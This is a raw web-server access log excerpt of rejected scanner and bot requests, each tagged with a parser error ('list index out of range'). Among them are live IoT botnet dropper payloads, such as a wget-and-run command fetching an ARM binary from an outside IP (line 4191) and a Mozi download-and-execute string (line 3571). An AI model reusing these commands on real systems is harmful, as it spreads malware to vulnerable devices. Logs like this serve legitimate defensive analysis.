2145@@138.68.249.116 - - [15/Nov/2021:10:39:13 +0000] "SSTP_DUPLEX_POST /sra_{BA195980-CD49-458b-9E23-C84EE0ADCD75}/ HTTP/1.1" 400 166 "-" "-"@@list index out of range
2229@@143.198.204.243 - - [15/Nov/2021:11:45:42 +0000] "" 400 0 "-" "-"@@list index out of range
2268@@89.248.165.52 - - [15/Nov/2021:12:51:43 +0000] "\x04\x01\x00\x19h/\x0C!\x00" 400 166 "-" "-"@@list index out of range
2269@@89.248.165.52 - - [15/Nov/2021:12:51:43 +0000] "\x05\x01\x00" 400 166 "-" "-"@@list index out of range
2352@@89.248.165.52 - - [15/Nov/2021:16:33:05 +0000] "\x04\x01\x00PU\xCE\xA0s\x00" 400 166 "-" "-"@@list index out of range
2353@@89.248.165.52 - - [15/Nov/2021:16:33:05 +0000] "\x05\x01\x00" 400 166 "-" "-"@@list index out of range
2397@@222.186.19.235 - - [15/Nov/2021:21:59:34 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\x8D\x5C\xA6\xD9" 400 166 "-" "-"@@list index out of range
2398@@222.186.19.235 - - [15/Nov/2021:21:59:34 +0000] "\x05\x01\x00" 400 166 "-" "-"@@list index out of range
2429@@161.35.236.158 - - [15/Nov/2021:22:45:15 +0000] "\x00\x0E8`x\x1CV\xCFqP\xDC\x00\x00\x00\x00\x00" 400 166 "-" "-"@@list index out of range
2498@@223.112.202.248 - - [15/Nov/2021:23:59:54 +0000] "sh+/tmp/gpon80&ipv=0" 400 166 "-" "-"@@list index out of range
2584@@142.93.34.237 - - [14/Nov/2021:04:10:16 +0000] "" 400 0 "-" "-"@@list index out of range
2609@@185.254.31.134 - - [14/Nov/2021:05:38:55 +0000] "\x16\x03\x01\x01C\x01\x00\x01?\x03\x03\x0E\xCAF\xD7\x16\x1B\xDD8\xDA\x06d\x80\xD55\xC89\xAF\x94r\xF2\xABC\xF9\x99\x96\x18Y\xF6\x15\x1E\xCDd \xD9\x14\xDCF\xFB\x96\xD2D\x00<W\xCD\xA1\xC3r\xE7\xD6\x97{F\x9F[:c\x9D\x12\xF30\xC5\x04\x5C\x8C\x00V\x13\x02\x13\x03\x13\x01\xC0,\xC00\xC0+\xC0/\xCC\xA9\xCC\xA8\x00\x9F\x00\x9E\xCC\xAA\xC0\xAF\xC0\xAD\xC0\xAE\xC0\xAC\xC0$\xC0(\xC0#\xC0'\xC0" 400 166 "-" "-"@@list index out of range
2876@@89.248.165.210 - - [14/Nov/2021:16:49:00 +0000] "\x03\x00\x00\x13\x0E\xE0\x00\x00\x00\x00\x00\x01\x00\x08\x00\x02\x00\x00\x00" 400 166 "-" "-"@@list index out of range
2892@@58.253.50.44 - - [14/Nov/2021:17:35:29 +0000] "/tmp/gpon80&ipv=0" 400 166 "-" "-"@@list index out of range
2923@@167.71.102.181 - - [14/Nov/2021:18:25:37 +0000] "\x00\x0E8\x0BF\x88\xB6\xC8\x18U\x87\x00\x00\x00\x00\x00" 400 166 "-" "-"@@list index out of range
2941@@142.93.34.237 - - [14/Nov/2021:18:35:34 +0000] "" 400 0 "-" "-"@@list index out of range
2944@@20.55.53.144 - - [14/Nov/2021:18:55:55 +0000] "\x16\x03\x01\x02\x00\x01\x00\x01\xFC\x03\x03F\xE5K\xA6\x07\x9D\xBE\xBEo\xD7\xF4|\xA9\x87\xF1\x1D#\xC8\x9AO\xB8x\xE8wH<Pq-\x82gY \x9B\x1D\xC0mZ\x8C|\xFFjH\xAE\x1F\xD7\xA9\x05\xFF}KVk\xA2\x8Dy\xF8\xBE\x011$z\xD1/\xAA\x00>\x13\x02\x13\x03\x13\x01\xC0,\xC00\x00\x9F\xCC\xA9\xCC\xA8\xCC\xAA\xC0+\xC0/\x00\x9E\xC0$\xC0(\x00k\xC0#\xC0'\x00g\xC0" 400 166 "-" "-"@@list index out of range
3060@@185.202.0.11 - - [26/Mar/2021:04:50:55 +0000] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 166 "-" "-"@@list index out of range
3069@@178.128.194.144 - - [26/Mar/2021:07:53:05 +0000] "238\x00ll|'|'|SGFjS2VkX0Q3NUU2QUFB|'|'|WIN-QZN7FJ7D1O|'|'|Administrator|'|'|18-11-28|'|'||'|'|Win 7 Ultimate SP1 x64|'|'|No|'|'|S17|'|'|..|'|'|SW5ib3ggLSBPdXRsb29rIERhdGEgRmlsZSAtIE1pY3Jvc29mdCBPdXRsb29rAA==|'|'|" 400 166 "-" "-"@@list index out of range
3072@@209.141.33.74 - - [26/Mar/2021:07:59:50 +0000] "" 400 0 "-" "-"@@list index out of range
3201@@178.175.46.224 - - [26/Mar/2021:09:58:27 +0000] ";sh+/tmp/gpon80&ipv=0" 400 166 "-" "-"@@list index out of range
3205@@61.219.11.153 - - [26/Mar/2021:10:53:45 +0000] "lv[endof]" 400 166 "-" "-"@@list index out of range
3233@@87.251.75.145 - - [26/Mar/2021:14:31:11 +0000] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 166 "-" "-"@@list index out of range
3252@@209.141.33.74 - - [26/Mar/2021:15:55:56 +0000] "" 400 0 "-" "-"@@list index out of range
3278@@61.219.11.153 - - [26/Mar/2021:16:39:35 +0000] "lv[endof]" 400 166 "-" "-"@@list index out of range
3281@@104.248.94.93 - - [26/Mar/2021:17:06:39 +0000] "\x16\x03\x01\x00u\x01\x00\x00q\x03\x03\xEE#UK(Wq|\xE7\x07\x1E\xD5\xCC\x0CQ\xE9\xA8\xE12Mk\x1D\xCDw>\x82\xEF\xCA\x0C\xD1k\xB4\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 166 "-" "-"@@list index out of range
3289@@209.141.33.74 - - [26/Mar/2021:18:57:27 +0000] "" 400 0 "-" "-"@@list index out of range
3304@@209.141.33.74 - - [26/Mar/2021:20:37:14 +0000] "" 400 0 "-" "-"@@list index out of range
3394@@209.14.31.43 - - [26/Mar/2021:21:49:24 +0000] "/tmp/gpon80&ipv=0" 400 166 "-" "-"@@list index out of range
3506@@5.188.6.72 - - [25/Nov/2021:03:32:00 +0000] "" 400 0 "-" "-"@@list index out of range
3521@@94.232.43.63 - - [25/Nov/2021:03:59:51 +0000] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Domain" 400 166 "-" "-"@@list index out of range
3522@@94.232.43.63 - - [25/Nov/2021:03:59:51 +0000] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Domain" 400 166 "-" "-"@@list index out of range
3571@@112.237.172.218 - - [25/Nov/2021:05:17:23 +0000] "27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$ HTTP/1.0" 400 166 "-" "-"@@list index out of range
3588@@205.185.124.100 - - [25/Nov/2021:06:10:37 +0000] "" 400 0 "-" "-"@@list index out of range
3613@@191.96.168.242 - - [25/Nov/2021:09:43:42 +0000] "\x00\x00\x02\x00" 400 166 "-" "-"@@list index out of range
3702@@205.185.124.100 - - [25/Nov/2021:14:44:02 +0000] "" 400 0 "-" "-"@@list index out of range
3706@@167.172.249.18 - - [25/Nov/2021:14:58:23 +0000] "\x16\x03\x01\x01\xFE\x01\x00\x01\xFA\x03\x03o\x92\xF58\xCB\x5C\xABz\x0B\x15\x85\xFDx\x09\x1A\x98W\x9D\xABL\xA7\xB1" 400 166 "-" "-"@@list index out of range
3772@@94.232.43.63 - - [25/Nov/2021:19:53:12 +0000] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Domain" 400 166 "-" "-"@@list index out of range
3773@@94.232.43.63 - - [25/Nov/2021:19:53:12 +0000] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Domain" 400 166 "-" "-"@@list index out of range
3779@@205.185.124.100 - - [25/Nov/2021:20:23:48 +0000] "" 400 0 "-" "-"@@list index out of range
3780@@89.248.165.23 - - [25/Nov/2021:20:37:51 +0000] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 166 "-" "-"@@list index out of range
3798@@35.236.79.183 - - [25/Nov/2021:21:47:39 +0000] "\x16\x03\x01\x00M\x01\x00\x00I\x03\x03\xC8s\xABw8\x80=\xBA\xA9Z\x1C\xA0\xE7\xDDvi^\xB7\x5C\xCA \xF0\xE7U\x8B\xAD\xC3\xC2\xA2\xEAs\xC2 \xD5V\xC9\xBEB\x067k\xA6\xA2" 400 166 "-" "-"@@list index out of range
3868@@94.232.40.134 - - [24/Nov/2021:01:56:29 +0000] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 166 "-" "-"@@list index out of range
3882@@205.185.124.100 - - [24/Nov/2021:03:06:53 +0000] "" 400 0 "-" "-"@@list index out of range
3886@@20.55.53.144 - - [24/Nov/2021:03:14:19 +0000] "\x16\x03\x01\x02\x00\x01\x00\x01\xFC\x03\x03=\xAC{C\xFDM1X:2:t\xAA2H\xC3\xF1\xC1\xC0\xC3!\xF62\xEA\xB1\xB1\xAFe\xCDw\x8D\x0B \xE2" 400 166 "-" "-"@@list index out of range
3888@@94.232.43.63 - - [24/Nov/2021:03:25:29 +0000] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Domain" 400 166 "-" "-"@@list index out of range
3889@@94.232.43.63 - - [24/Nov/2021:03:25:29 +0000] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Domain" 400 166 "-" "-"@@list index out of range
3890@@185.170.209.132 - - [24/Nov/2021:03:29:10 +0000] "" 400 0 "-" "-"@@list index out of range
3893@@185.100.87.136 - - [24/Nov/2021:03:45:30 +0000] "\xC9\x94\xD1\xA6\xAE\x9C\x05lM/\x09\x8Cp#\xEE\x9D*5#]\xC7R:\xC8\x8E/\x11\xB8\xCD\x89Z\xFB\xA4\x19f\xD2\xCE\xB3\xA1\x81\xBB\xFC\xA0\xDD%d1\x17\xA6%n\xC5" 400 166 "-" "-"@@list index out of range
3894@@185.100.87.136 - - [24/Nov/2021:03:45:30 +0000] "\x10 \x00\x00BBBB\xBA\x8C\xC1\xABDAAA" 400 166 "-" "-"@@list index out of range
3931@@103.153.76.212 - - [24/Nov/2021:05:37:15 +0000] "" 400 0 "-" "-"@@list index out of range
3940@@94.232.40.135 - - [24/Nov/2021:05:49:03 +0000] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 166 "-" "-"@@list index out of range
3965@@87.251.75.40 - - [24/Nov/2021:07:47:13 +0000] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 166 "-" "-"@@list index out of range
3967@@157.245.176.143 - - [24/Nov/2021:08:08:16 +0000] "SSTP_DUPLEX_POST /sra_{BA195980-CD49-458b-9E23-C84EE0ADCD75}/ HTTP/1.1" 400 166 "-" "-"@@list index out of range
3970@@94.232.43.63 - - [24/Nov/2021:08:20:57 +0000] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Domain" 400 166 "-" "-"@@list index out of range
3971@@94.232.43.63 - - [24/Nov/2021:08:20:57 +0000] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Domain" 400 166 "-" "-"@@list index out of range
3985@@193.56.29.48 - - [24/Nov/2021:08:55:16 +0000] "" 400 0 "-" "-"@@list index out of range
3986@@193.56.29.48 - - [24/Nov/2021:08:55:16 +0000] "" 400 0 "-" "-"@@list index out of range
3992@@87.251.75.40 - - [24/Nov/2021:09:08:01 +0000] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 166 "-" "-"@@list index out of range
4097@@161.35.111.132 - - [24/Nov/2021:11:03:45 +0000] "" 400 0 "-" "-"@@list index out of range
4191@@77.247.93.41 - - [24/Nov/2021:12:29:08 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+ 185.245.96.227/bins/arm;chmod+777+/tmp/arm;sh+/tmp/arm+selfrep.jaws HTTP/1.1" 499 0 "-" "Hello, world"@@list index out of range
4200@@94.232.46.202 - - [24/Nov/2021:12:49:36 +0000] "\x00\x0E87\xA5&\x08\xA2\x1B\xA0\xB1\x00\x00\x00\x00\x00" 400 166 "-" "-"@@list index out of range
4228@@64.227.99.233 - - [24/Nov/2021:13:21:46 +0000] "\x00\x0E8\xF9%\x89\xAD\xF4\xB1\xBF\xCD\x00\x00\x00\x00\x00" 400 166 "-" "-"@@list index out of range
4248@@20.55.53.144 - - [24/Nov/2021:14:13:48 +0000] "\x16\x03\x01\x02\x00\x01\x00\x01\xFC\x03\x03$^\xAFZ\xB1\x87\xE31D\x8C\x87\xF9\xBF-_\xB6\x90f\x99\x09ml&_\xAF\xF1\x81V\xCD\x22\xBB\xEB $z\x93PQ\xA9\x82\xFA\xB7\xD0u\xAAVu\x988\x9D\x18N\xC3\x91\xED\x5C\xF2\x08oOneK\xA9\xC8\x00>\x13\x02\x13\x03\x13\x01\xC0,\xC00\x00\x9F\xCC\xA9\xCC\xA8\xCC\xAA\xC0+\xC0/\x00\x9E\xC0$\xC0(\x00k\xC0#\xC0'\x00g\xC0" 400 166 "-" "-"@@list index out of range
4284@@20.55.53.144 - - [24/Nov/2021:14:26:22 +0000] "\x16\x03\x01\x02\x00\x01\x00\x01\xFC\x03\x03\xDB=\x89\x9F\x9AW\xDDqo\xFC\xFC\x03\x07Q :\x9B[\x09\xADE\xC6\x11c\x865\xCA;\xAEL\x83\xDA \x5C\xE9M\x9E\xB2\xB8\xB6\xF5-WT\x81\xBF\xBE\xFD_\xDF\xD4t\xFE\xB2CJ\x14\xFA\x8B0\x8C\x8D\xF7\xEE\xFD\x00>\x13\x02\x13\x03\x13\x01\xC0,\xC00\x00\x9F\xCC\xA9\xCC\xA8\xCC\xAA\xC0+\xC0/\x00\x9E\xC0$\xC0(\x00k\xC0#\xC0'\x00g\xC0" 400 166 "-" "-"@@list index out of range
4316@@167.71.102.95 - - [24/Nov/2021:15:43:45 +0000] "\x00\x0E8\xA7e6O-\x8BIS\x00\x00\x00\x00\x00" 400 166 "-" "-"@@list index out of range
4333@@77.83.36.32 - - [24/Nov/2021:16:49:04 +0000] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 166 "-" "-"@@list index out of range
4389@@161.35.86.181 - - [24/Nov/2021:20:42:28 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03?P\x87\xA6`\x88\x0E\xD4\x00\xE6\xCF#\xDF]C\xA8c\x1Ao\xDC\x14\x1F\x7F\x15\x00\xCDO\xDFwJ\xDF\xC0 &l\xEA\x83\x92`)\xAA\x17\xC6\xF8Ov\x86\x83\xC4o\xE0-\x87\x10O\xB4\x83yvf0\x1CC\x13\xE3\x00&\xC0/\xC00\xC0+\xC0,\xCC\xA8\xCC\xA9\xC0\x13\xC0\x09\xC0\x14\xC0" 400 166 "-" "-"@@list index out of range
4427@@66.240.205.34 - - [24/Nov/2021:22:27:35 +0000] "H\x00\x00\x00tj\xA8\x9E#D\x98+\xCA\xF0\xA7\xBBl\xC5\x19\xD7\x8D\xB6\x18\xEDJ\x1En\xC1\xF9xu[l\xF0E\x1D-j\xEC\xD4xL\xC9r\xC9\x15\x10u\xE0%\x86Rtg\x05fv\x86]%\xCC\x80\x0C\xE8\xCF\xAE\x00\xB5\xC0f\xC8\x8DD\xC5\x09\xF4" 400 166 "-" "-"@@list index out of range
4452@@94.232.43.63 - - [24/Nov/2021:23:11:57 +0000] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Domain" 400 166 "-" "-"@@list index out of range
4453@@94.232.43.63 - - [24/Nov/2021:23:11:57 +0000] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Domain" 400 166 "-" "-"@@list index out of range
4519@@222.186.19.235 - - [23/Nov/2021:00:03:17 +0000] "\x05\x01\x00" 400 166 "-" "-"@@list index out of range
4520@@222.186.19.235 - - [23/Nov/2021:00:03:17 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\x8A\xD5N\x82Q\x0C\xEA\x95j\x0E\xA1\xBA\xB1\xCD\xAD\x0BL\xC06\xA6y\x9A\x1Cr\x9A\xC4<\xB9\xE6\xA4\xDE\xA4 V\xC6\xB8\x0F\xCC'\x1A\x8C\xAC\xFD8o\xF7\xB4\xA0\x94\xBA\xB9i#\xD4\x91 \xB2K\x07@h\x91\xB0&O\x00&\xCC\xA8\xCC\xA9\xC0/\xC00\xC0+\xC0,\xC0\x13\xC0\x09\xC0\x14\xC0" 400 166 "-" "-"@@list index out of range
4530@@94.232.46.202 - - [23/Nov/2021:00:43:36 +0000] "\x00\x0E87\xA5&\x08\xA2\x1B\xA0\xB1\x00\x00\x00\x00\x00" 400 166 "-" "-"@@list index out of range
4570@@94.232.40.134 - - [23/Nov/2021:02:33:14 +0000] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 166 "-" "-"@@list index out of range
4613@@66.240.205.34 - - [23/Nov/2021:04:16:48 +0000] "145.ll|'|'|SGFjS2VkX0Q0OTkwNjI3|'|'|WIN-JNAPIER0859|'|'|JNapier|'|'|19-02-01|'|'||'|'|Win 7 Professional SP1 x64|'|'|No|'|'|0.7d|'|'|..|'|'|AA==|'|'|112.inf|'|'|SGFjS2VkDQoxOTIuMTY4LjkyLjIyMjo1NTUyDQpEZXNrdG9wDQpjbGllbnRhLmV4ZQ0KRmFsc2UNCkZhbHNlDQpUcnVlDQpGYWxzZQ==12.act|'|'|AA==" 400 166 "-" "-"@@list index out of range
4715@@94.232.40.135 - - [23/Nov/2021:06:15:49 +0000] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 166 "-" "-"@@list index out of range
4723@@34.86.35.13 - - [23/Nov/2021:06:39:52 +0000] "\x16\x03\x01\x00\xE5\x01\x00\x00\xE1\x03\x03\xEA\x01\xD8-\x0E' l\x0EZ\x22\xBF\xF1kH\x15\x89$\xF5\x10\xD7\xBA\x01`\xB1z\xACH\xD1\xA8\xC8>\x00\x00h\xCC\x14\xCC\x13\xC0/\xC0+\xC00\xC0,\xC0\x11\xC0\x07\xC0'\xC0#\xC0\x13\xC0\x09\xC0(\xC0$\xC0\x14\xC0" 400 166 "-" "-"@@list index out of range
4872@@199.195.251.213 - - [23/Nov/2021:10:24:51 +0000] "" 400 0 "-" "-"@@list index out of range
4882@@120.2.68.6 - - [23/Nov/2021:10:35:24 +0000] "/tmp/gpon80&ipv=0" 400 166 "-" "-"@@list index out of range
4906@@205.185.124.100 - - [23/Nov/2021:12:20:50 +0000] "" 400 0 "-" "-"@@list index out of range
4919@@66.240.205.34 - - [23/Nov/2021:12:47:34 +0000] "H\x00\x00\x00tj\xA8\x9E#D\x98+\xCA\xF0\xA7\xBBl\xC5\x19\xD7\x8D\xB6\x18\xEDJ\x1En\xC1\xF9xu[l\xF0E\x1D-j\xEC\xD4xL\xC9r\xC9\x15\x10u\xE0%\x86Rtg\x05fv\x86]%\xCC\x80\x0C\xE8\xCF\xAE\x00\xB5\xC0f\xC8\x8DD\xC5\x09\xF4" 400 166 "-" "-"@@list index out of range
4921@@159.203.59.32 - - [23/Nov/2021:12:53:16 +0000] "\x16\x03\x01\x01\xFE\x01\x00\x01\xFA\x03\x03\x1C\xC4\x92\xD8\x9Ei~p\xEB&\xF9\xE1\xF8\x928\x1C\x91\xA2v\xA5\x02\xC5\xD0\xD4s\x5C\xD9.\xD3n~\xC6\x00\x01<\xCC\x14\xCC\x13\xCC\x15\xC00\xC0,\xC0(\xC0$\xC0\x14\xC0" 400 166 "-" "-"@@list index out of range
4928@@222.186.19.235 - - [23/Nov/2021:12:53:54 +0000] "\x05\x01\x00" 400 166 "-" "-"@@list index out of range
5160@@66.240.205.34 - - [23/Nov/2021:19:17:44 +0000] "145.ll|'|'|SGFjS2VkX0Q0OTkwNjI3|'|'|WIN-JNAPIER0859|'|'|JNapier|'|'|19-02-01|'|'||'|'|Win 7 Professional SP1 x64|'|'|No|'|'|0.7d|'|'|..|'|'|AA==|'|'|112.inf|'|'|SGFjS2VkDQoxOTIuMTY4LjkyLjIyMjo1NTUyDQpEZXNrdG9wDQpjbGllbnRhLmV4ZQ0KRmFsc2UNCkZhbHNlDQpUcnVlDQpGYWxzZQ==12.act|'|'|AA==" 400 166 "-" "-"@@list index out of range
5204@@185.142.236.40 - - [23/Nov/2021:20:46:47 +0000] "\x033S\x9Da\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" 400 166 "-" "-"@@list index out of range
5300@@103.153.76.212 - - [23/Nov/2021:22:16:36 +0000] "" 400 0 "-" "-"@@list index out of range
5425@@94.232.43.63 - - [22/Nov/2021:02:54:45 +0000] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Domain" 400 166 "-" "-"@@list index out of range
5426@@94.232.43.63 - - [22/Nov/2021:02:54:45 +0000] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Domain" 400 166 "-" "-"@@list index out of range
